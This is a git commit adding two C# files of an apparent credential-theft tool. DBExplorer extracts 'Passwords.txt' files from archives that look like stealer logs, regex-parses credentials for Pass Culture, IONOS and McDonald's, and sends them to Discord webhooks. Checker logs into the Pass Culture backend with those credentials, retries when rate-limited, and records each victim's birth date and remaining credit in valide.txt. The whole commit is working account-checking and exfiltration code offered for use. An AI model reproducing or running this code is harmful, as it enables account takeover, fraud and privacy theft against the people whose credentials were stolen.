5b5c1cbeaef5f3e81b0d48bfadef7eef87270452
Skippyturtle <57076195+Skippyturtle@users.noreply.github.com>
2023-11-01 03:17:39 +0100

    Add files via upload

---
+++ Checker.cs
@@ -0,0 +1,234 @@
+﻿using System.Net;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
+
+namespace DataVortex
+{
+    internal class Checker
+    {
+        public static double Remaining1 { get; private set; }
+        public static string Activity { get; private set; }
+        public static string BirthDate { get; private set; }
+
+        private static HashSet<string> foundAccounts = new HashSet<string>();
+        private static Dictionary<string, bool> accountVerificationStatus = new Dictionary<string, bool>();
+
+        public static void HandleAccount(string keyword, (string url, string username, string password, string app) account)
+        {
+            if (IsAccountVerified(account.username, account.password))
+            {
+                Console.ForegroundColor = ConsoleColor.Magenta;
+                Console.WriteLine("Ce compte a déjà été vérifié. Ignoré.");
+                Console.ResetColor();
+                return;
+            }
+
+            switch (keyword)
+            {
+                case "passculture":
+                    CheckPassCultureAsync(account.username, account.password);
+                    break;
+                    // Ajoutez d'autres cas ici pour gérer d'autres types de comptes
+            }
+        }
+
+        private static bool IsAccountVerified(string username, string password)
+        {
+            string key = $"{username}:{password}";
+            if (accountVerificationStatus.ContainsKey(key))
+            {
+                return accountVerificationStatus[key];
+            }
+            return false;
+        }
+
+
+        public static void MarkAccountAsVerified(string username, string password)
+        {
+            string key = $"{username}:{password}";
+            accountVerificationStatus[key] = true;
+        }
+
+
+        public static async Task CheckPassCultureAsync(string username, string password)
+        {
+            var url = "https://backend.passculture.app/native/v1/signin";
+
+            var httpRequest = (HttpWebRequest)WebRequest.Create(url);
+            httpRequest.Method = "POST";
+            httpRequest.ContentType = "application/json";
+
+            var data = "{\"identifier\":\"" + username + "\",\"password\":\"" + password + "\"}";
+
+            try
+            {
+                using (var streamWriter = new StreamWriter(httpRequest.GetRequestStream()))
+                {
+                    streamWriter.Write(data);
+                }
+
+                var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
+                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+                {
+                    var result = streamReader.ReadToEnd();
+                    var jsonResponse = JObject.Parse(result);
+
+                    // Vérification de l'accountState
+                    if (jsonResponse["accountState"] != null)
+                    {
+                        var accountState = jsonResponse["accountState"].ToString();
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine($"accountState: {accountState}");
+                        Console.ResetColor();
+
+                        if (accountState == "SUSPICIOUS_LOGIN_REPORTED_BY_USER")
+                        {
+
+                            // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
+                            using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
+                                sw.WriteLine($"{username}:{password}");
+                        }
+                    }
+
+                    if (httpResponse.StatusCode == HttpStatusCode.BadRequest)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
+                        Console.ResetColor();
+
+                        // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
+                        using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
+                            sw.WriteLine($"{username}:{password}");
+                    }
+
+                    if (jsonResponse["accessToken"] != null && !jsonResponse["accountState"].ToString().Equals("SUSPICIOUS_LOGIN_REPORTED_BY_USER"))
+                    {
+                        var accessToken = jsonResponse["accessToken"].ToString();
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine($"accessToken: {accessToken}");
+                        Console.ResetColor();
+
+                        var url2 = "https://backend.passculture.pro/users/signin";
+                        var httpRequest2 = (HttpWebRequest)WebRequest.Create(url2);
+                        httpRequest2.Method = "POST";
+
+                        httpRequest2.Headers["Authorization"] = "Bearer " + accessToken;
+                        httpRequest2.ContentType = "application/json";
+
+                        var data2 = "{\"identifier\":\"" + username + "\",\"password\":\"" + password + "\"}";
+
+                        using (var streamWriter2 = new StreamWriter(httpRequest2.GetRequestStream()))
+                        {
+                            streamWriter2.Write(data2);
+                        }
+
+                        var httpResponse2 = (HttpWebResponse)httpRequest2.GetResponse();
+                        using (var streamReader2 = new StreamReader(httpResponse2.GetResponseStream()))
+                        {
+                            var result2 = streamReader2.ReadToEnd();
+                            var jsonResponse2 = JObject.Parse(result2);
+
+                            if (jsonResponse2["activity"] != null)
+                            {
+                                Activity = jsonResponse2["activity"].ToString();
+                                Console.ForegroundColor = ConsoleColor.Yellow;
+                                Console.WriteLine($"activity: {Activity}");
+                                Console.ResetColor();
+                            }
+
+                            var url3 = "https://backend.passculture.app/native/v1/me";
+                            var httpRequest3 = (HttpWebRequest)WebRequest.Create(url3);
+                            httpRequest3.Headers["Authorization"] = "Bearer " + accessToken;
+
+                            var httpResponse3 = (HttpWebResponse)httpRequest3.GetResponse();
+                            using (var streamReader3 = new StreamReader(httpResponse3.GetResponseStream()))
+                            {
+                                var result3 = streamReader3.ReadToEnd();
+                                var jsonResponse3 = JObject.Parse(result3);
+
+                                if (jsonResponse3["birthDate"] != null)
+                                {
+                                    BirthDate = jsonResponse3["birthDate"].ToString();
+                                    Console.ForegroundColor = ConsoleColor.Yellow;
+                                    Console.WriteLine($"birthDate: {BirthDate}");
+                                    Console.ResetColor();
+                                }
+
+                                if (jsonResponse3["domainsCredit"] != null)
+                                {
+                                    var domainsCredit = jsonResponse3["domainsCredit"];
+
+                                    if (domainsCredit["all"] != null)
+                                    {
+                                        var allCredit = domainsCredit["all"];
+
+                                        if (allCredit["remaining"] != null)
+                                        {
+                                            var remaining = allCredit["remaining"].ToObject<int>();
+                                            Remaining1 = (double)remaining / 100.0;
+                                            Console.ForegroundColor = ConsoleColor.Yellow;
+                                            Console.WriteLine($"Remaining1: {Remaining1}");
+                                            Console.ResetColor();
+                                        }
+                                    }
+                                }
+                                // Create a JSON object with the relevant details
+                                var accountDetails = new
+                                {
+                                    Username = username,
+                                    Password = password,
+                                    Activity = Activity,
+                                    BirthDate = BirthDate,
+                                    Remaining1 = Remaining1
+                                };
+
+                                // Serialize the JSON object to a string
+                                var jsonDetails = JsonConvert.SerializeObject(accountDetails);
+
+                                // Append the JSON string to the "valide.txt" file
+                                using (StreamWriter sw = new StreamWriter("valide.txt", true))
+                                {
+                                    sw.WriteLine(jsonDetails);
+                                }
+                            }
+                        }
+                    }
+                }
+                // Marquer le compte comme vérifié une fois la vérification réussie
+                MarkAccountAsVerified(username, password);
+            }
+            catch (WebException ex)
+            {
+                if (ex.Response is HttpWebResponse errorResponse)
+                {
+                    if (errorResponse.StatusCode == HttpStatusCode.BadRequest)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
+                        Console.ResetColor();
+
+                        // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
+                        using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
+                            sw.WriteLine($"{username}:{password}");
+
+                        // Ajouter le compte dans la liste des vérifiés pour ne pas le revérifier plusieurs fois
+                        MarkAccountAsVerified(username, password);
+                    }
+                    else if (errorResponse.StatusCode == (HttpStatusCode)429)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Erreur 429 : Rate limit atteint. Prochaine tentative dans 1 minute.");
+                        Console.ResetColor();
+                        Thread.Sleep(120000); // Attendez 2 minute (120 000 millisecondes) avant de réessayer.
+                        await CheckPassCultureAsync(username, password); // Réessayez après l'attente.
+                    }
+                }
+            }
+        }
+
+        public static async Task DelayAsync(int milliseconds)
+        {
+            await Task.Delay(milliseconds);
+        }
+    }
+}
---
+++ DBExplorer.cs
@@ -0,0 +1,200 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text.RegularExpressions;
+using Ionic.Zip;
+using SharpCompress.Archives;
+using SharpCompress.Archives.Rar;
+using SharpCompress.Common;
+using ColorfulConsole = Colorful.Console;
+
+namespace DBExplorer
+{
+    public static class DBExplorer
+    {
+        private static DateTime startTime;
+
+        public static void Run(string downloadPath)
+        {
+            PrintBanner();
+            string folderPath = downloadPath;
+            string[] archives = Directory.GetFiles(folderPath, "*.rar")
+                                           .Concat(Directory.GetFiles(folderPath, "*.zip"))
+                                           .ToArray();
+
+            if (archives.Length == 0)
+            {
+                System.Console.WriteLine("Aucune archive détectée dans le dossier spécifié.");
+                return;
+            }
+
+            List<string> processedArchives = LoadProcessedArchives();
+
+            foreach (string archivePath in archives)
+            {
+                string archiveName = Path.GetFileName(archivePath); // Obtenez le nom de l'archive
+                if (processedArchives.Contains(archiveName))
+                {
+                    System.Console.WriteLine($"Archive déjà traitée: {archiveName}");
+                    File.Delete(archivePath);
+                    continue;
+                }
+                Console.ForegroundColor = ConsoleColor.Red;
+                System.Console.WriteLine($"Archive détectée: {archiveName}");
+                Console.ResetColor();
+
+                startTime = DateTime.Now; // Save the start time before extraction
+
+                ExtractArchive(archivePath, "dbdtemp");
+
+                var results = FindPasswords();
+
+                foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
+                {
+                    if (results.ContainsKey(keyword) && results[keyword].Count > 0)
+                    {
+                        if (keyword == "passculture")
+                        {
+                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookPassculture(
+                                results[keyword],
+                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
+                                archiveName, // Utilisez le nom de l'archive
+                                DataVortex.Checker.BirthDate,
+                                DataVortex.Checker.Remaining1,
+                                DataVortex.Checker.Activity
+                            ).Wait();
+                        }
+                        else if (keyword == "ionos")
+                        {
+                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookIonos(
+                                results[keyword],
+                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
+                                archiveName // Utilisez le nom de l'archive
+                            ).Wait();
+                        }
+                        else if (keyword == "mcdo")
+                        {
+                            DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookMcdo(
+                                results[keyword],
+                                DataVortex.keywords.UrlChecker.Keywords.List[keyword],
+                                archiveName // Utilisez le nom de l'archive
+                            ).Wait();
+                        }
+                    }
+                }
+
+                processedArchives.Add(archiveName); // Ajoutez le nom de l'archive à la liste
+                File.Delete(archivePath); // Supprimez le fichier d'archive actuellement traité
+            }
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("Fin de l'archive");
+            Console.ResetColor();
+
+            File.WriteAllLines("processed_archives.txt", processedArchives);
+
+            // Supprimer le contenu du répertoire dbdtemp
+            if (Directory.Exists("dbdtemp"))
+            {
+                DirectoryInfo directory = new DirectoryInfo("dbdtemp");
+                foreach (FileInfo file in directory.GetFiles())
+                {
+                    file.Delete();
+                }
+                foreach (DirectoryInfo subDirectory in directory.GetDirectories())
+                {
+                    subDirectory.Delete(true);
+                }
+
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Contenu de dbdtemp supprimé avec succès.");
+                Console.ResetColor();
+            }
+        }
+
+        private static void PrintBanner()
+        {
+            ColorfulConsole.WriteLine(Figgle.FiggleFonts.Standard.Render("DBExplorer"));
+        }
+
+        private static void ExtractArchive(string filename, string output_path)
+        {
+            if (IsArchiveFile(filename))
+            {
+                using (var archive = ArchiveFactory.Open(filename))
+                {
+                    foreach (var entry in archive.Entries)
+                    {
+                        if (!entry.IsDirectory && (entry.Key.EndsWith("Passwords.txt") || entry.Key.EndsWith("ALL Passwords.txt")))
+                        {
+                            string relativePath = entry.Key;
+                            string outputPath = Path.GetFullPath(Path.Combine(output_path, relativePath));
+                            string outputDirPath = Path.GetDirectoryName(outputPath) ?? Path.Combine(output_path, "default");
+
+                            Directory.CreateDirectory(outputDirPath);
+                            entry.WriteToFile(outputPath, new ExtractionOptions { ExtractFullPath = true, Overwrite = true });
+                        }
+                    }
+                }
+            }
+            else
+            {
+                ColorfulConsole.WriteLine("Erreur : format d'archive non pris en charge", System.Drawing.Color.Blue);
+                Console.ResetColor();
+                File.Delete(filename);
+            }
+        }
+
+        private static bool IsArchiveFile(string filename)
+        {
+            return ZipFile.IsZipFile(filename) || RarArchive.IsRarFile(filename);
+        }
+
+        public static Dictionary<string, List<(string urlOrHost, string username, string password, string app)>> FindPasswords()
+        {
+            var results = new Dictionary<string, List<(string urlOrHost, string username, string password, string app)>>();
+            var directoryPath = "dbdtemp";
+            var files = Directory.GetFiles(directoryPath, "Passwords.txt", SearchOption.AllDirectories);
+
+            foreach (var file in files)
+            {
+                var contents = File.ReadAllText(file);
+                var matches = Regex.Matches(contents, @"(URL|Host):\s*(.*?)\nUsername:\s*(.*?)\nPassword:\s*(.*?)\nApplication:\s*(.*?)\n=*");
+
+                foreach (Match match in matches)
+                {
+                    var urlOrHost = match.Groups[2].Value.Trim();
+                    var username = match.Groups[3].Value.Trim();
+                    var password = match.Groups[4].Value.Trim();
+                    var app = match.Groups[5].Value.Trim();
+
+                    foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
+                    {
+                        if (urlOrHost.Contains(keyword))
+                        {
+                            var result = (urlOrHost, username, password, app);
+
+                            DataVortex.Checker.HandleAccount(keyword, result);
+
+                            if (!results.ContainsKey(keyword))
+                            {
+                                results[keyword] = new List<(string urlOrHost, string username, string password, string app)>();
+                            }
+                            results[keyword].Add(result);
+                        }
+                    }
+                }
+            }
+
+            return results;
+        }
+
+        public static List<string> LoadProcessedArchives()
+        {
+            if (File.Exists("processed_archives.txt"))
+            {
+                return File.ReadAllLines("processed_archives.txt").ToList();
+            }
+            return new List<string>();
+        }
+    }
+}
